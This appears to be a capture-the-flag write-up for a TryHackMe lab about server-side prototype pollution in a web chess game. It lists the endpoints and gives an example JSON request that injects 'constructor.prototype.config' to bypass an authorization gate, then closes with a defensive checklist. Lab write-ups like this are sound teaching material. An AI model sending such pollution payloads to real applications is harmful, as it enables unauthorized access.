# Fool's Mate, Revenge — Technical Notes

## Room
https://tryhackme.com/room/foolsm8v2

## Core Finding
Prototype Pollution in server-side deep-merge logic can alter inherited configuration state used by a reward authorization gate.

## Key Endpoints
```text
/api/settings
/api/move
/js/app.js
```

## Winning Move
```text
a1 → a8
```

## Authorization Clue
```text
session.config.unlocked
```

## Stable Prototype Injection
Conceptual structure:

```text
constructor
  └── prototype
       └── config = true
```

Example lab request shape:

```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 180,
  "constructor": {
    "prototype": {
      "config": true
    }
  }
}
```

## Public Flag Policy
```text
THM{REDACTED_FOR_PUBLICATION}
```

## Defensive Checklist
- strict JSON schema
- field allowlisting
- reject `__proto__`, `constructor`, `prototype`
- avoid unsafe deep merge
- use own-property checks
- avoid exposing stack traces
- separate preferences from security state
